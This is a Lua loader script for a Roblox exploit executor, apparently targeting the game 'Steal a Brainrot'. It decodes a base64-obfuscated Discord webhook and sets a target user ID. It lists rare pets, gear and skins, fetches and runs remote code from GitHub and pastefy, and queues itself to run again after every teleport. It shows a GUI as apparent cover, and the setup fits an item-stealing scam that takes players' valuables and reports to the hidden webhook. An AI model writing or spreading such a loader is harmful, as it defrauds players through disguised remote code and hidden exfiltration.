-- ===================== K2 CONFIG =====================
-- 1st execute: GUI + extras + main + webhook
-- Rejoin on allowed place: main + webhook only (no GUI)
local genv = getgenv()

genv.GOOD_WEBHOOK = (function()
    local d="aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU0NDIxMjY5NTIyODc0MzY4MC9rZGhRSW8wamphMkp2eXdaUS1QVVN2UHBSYnRMb0xacTVRY3ZHM2Z3aGxZV19fNkRPYTFZOTlldWVqSXhmaXlRaXc3cQ=="
    local B="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    local o,b={},{}
    for i=1,#B do b[B:sub(i,i)]=i-1 end
    local n,bits=0,0
    for i=1,#d do
        local c=d:sub(i,i)
        if c~='=' then
            local v=b[c]
            if v then
                n=n*64+v; bits=bits+6
                if bits>=8 then bits=bits-8; o[#o+1]=string.char(math.floor(n/2^bits)%256); n=n%2^bits end
            end
        end
    end
    return table.concat(o)
end)()

genv.TARGET_USER_ID = 2829121161
genv.GOOD_AVATAR = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"

genv.ALLOWED_ANIMALS = {
    "Strawberry Elephant",
    "Headless Horseman",
    "Meowl",
    "John Pork",
    "Skibidi Toilet",
    "Griffin",
    "Dragon Aquanini",
    "Dragon Gingerini",
    "Hydra Dragon Cannelloni",
    "Signore Carapace",
    "Dragon Cannelloni",
    "Love Love Bear",
    "Moby Bros",
    "Digi Narwhal",
    "Kraken",
    "La Supreme Combinasion",
    "Elefanto Frigo",
    "Hydra Bunny",
    "Celestial Pegasus",
    "Cerberus",
    "Jelly Moby",
    "Bumbatron",
    "Bunny and Eggy",
    "Popcuru and Fizzuru",
    "Rosey and Teddy",
    "Capitano Moby",
    "Cooki and Milki",
    "Arcadragon",
    "Burguro And Fryuro",
    "Los Secret Combinasionas",
    "Ketupat Bros",
    "Reinito Sleighito",
    "Fortunu and Cashuru",
    "Los Amigos",
    "Pizza and Ranch",
    "Antonio",
    "La Secret Combinasion",
    "Pancake and Syrup",
    "Foxini Lanternini",
    "Kalika Bros",
    "Los Sekolahs",
    "Sammyni Fattini",
    "Fishino Clownino",
    "Cash or Card",
    "Fragrama and Chocrama",
    "La Casa Boo",
    "Los Admins",
    "Duggy Bros",
    "La Food Combinasion",
    "S'more Serat",
    "Sammyni Cakini",
    "Boppin Bunny",
    "Spooky and Pumpky",
    "Ginger Gerat",
    "Los Chillis",
    "Los Hackers",
    "Bearito Cabinito",
    "Rubiko and Kubiko",
    "Capitano Americano",
    "Examen Bros",
    "Los Spaghettis",
    "Rubrikiko",
    "Festive 67",
    "Guest 666",
    "Quackini Snackini",
    "Cloverat Clapat",
    "Caylusaurus",
    "Hopilikalika Hopilikalako",
    "Garama and Madundung",
    "Globa Steppa",
    "Fragola La La La",
    "Dug Dug Dug",
    "Rico Dinero",
    "Tirilikalika Tirilikalako",
    "Jolly Jolly Sahur",
    "Yetimatic",
    "La Breakfast Combinasion",
    "La Fuse Machine",
    "Money Money Bros",
    "Sammyini Truckini",
    "Orchidox",
    "Venuspino",
    "Sammyni Truckini",
    "Grabatron",
    "Polaroidini"
}

genv.ALLOWED_BASESKINS = {
    ["Tralala"] = true
}

genv.ALLOWED_GEARS = {
    ["Bloodmoon Slap"] = true,
    ["Bloodmoon Hammer"] = true,
    ["Rainbow Hammer"] = true,
    ["Candy Sentry"] = true,
    ["Santa's Sleigh"] = true,
    ["Witch's Broom"] = true,
    ["Waverider"] = true,
    ["Cupid's Wings"] = true
}

genv.ALLOWED_PLACE_IDS = {
    109983668079237
}

genv.MAIN_URL = "https://raw.githubusercontent.com/norgegat-byte/K2AUTO/refs/heads/main/main.lua"

-- Extra scripts (moved out of main)
genv.EXTRA_LOADSTRINGS = {
    "https://pastefy.app/I9mewuyb/raw"
}

local isRejoin = (getgenv().BrainrotFromRejoin == true)

-- Optional GUI — FIRST EXECUTE ONLY
if not isRejoin then
    task.spawn(function()
        pcall(function()
    loadstring(game:HttpGet("https://pastefy.app/kDpzbuhg/raw"))()
        end)
    end)
else
    print("[K2] Rejoin mode — GUI skipped")
end

-- Main (webhook on first run AND rejoin) — only once
task.spawn(function()
    getgenv().BrainrotMainLoaded = nil
    pcall(function()
        loadstring(game:HttpGet(genv.MAIN_URL))()
    end)
end)

-- Place-gated auto-rejoin (bakes settings so lists survive teleport)
task.spawn(function()
    local q = (syn and syn.queue_on_teleport) or queue_on_teleport
    if not q then
        warn("[K2] queue_on_teleport missing — rejoin autoexec unavailable")
        return
    end

    local animals = {}
    for _, n in ipairs(genv.ALLOWED_ANIMALS or {}) do
        animals[#animals + 1] = string.format("%q", n)
    end

    local skins = {}
    for k, v in pairs(genv.ALLOWED_BASESKINS or {}) do
        if v then
            skins[#skins + 1] = string.format("[%q]=true", k)
        end
    end

    local gears = {}
    for k, v in pairs(genv.ALLOWED_GEARS or {}) do
        if v then
            gears[#gears + 1] = string.format("[%q]=true", k)
        end
    end

    local places = table.concat(genv.ALLOWED_PLACE_IDS or { 109983668079237 }, ",")

    local code = string.format([[
getgenv().BrainrotFromRejoin = true
getgenv().BrainrotMainLoaded = nil
getgenv().GOOD_WEBHOOK = %q
getgenv().TARGET_USER_ID = %s
getgenv().GOOD_AVATAR = %q
getgenv().MAIN_URL = %q
getgenv().ALLOWED_PLACE_IDS = {%s}
getgenv().ALLOWED_ANIMALS = {%s}
getgenv().ALLOWED_BASESKINS = {%s}
getgenv().ALLOWED_GEARS = {%s}
getgenv().EXTRA_LOADSTRINGS = {}
task.spawn(function()
    local allowed = getgenv().ALLOWED_PLACE_IDS or {109983668079237}
    local ok = false
    for _, id in ipairs(allowed) do
        if tonumber(id) == tonumber(game.PlaceId) then
            ok = true
            break
        end
    end
    if not ok then
        return
    end
    task.wait(2)
    pcall(function()
        loadstring(game:HttpGet(getgenv().MAIN_URL))()
    end)
end)
]], genv.GOOD_WEBHOOK, tostring(genv.TARGET_USER_ID), genv.GOOD_AVATAR, genv.MAIN_URL,
        places, table.concat(animals, ", "), table.concat(skins, ", "), table.concat(gears, ", "))

    pcall(function()
        q(code)
    end)
    print("[K2] Rejoin queued (allowed place only, no GUI)")
end)
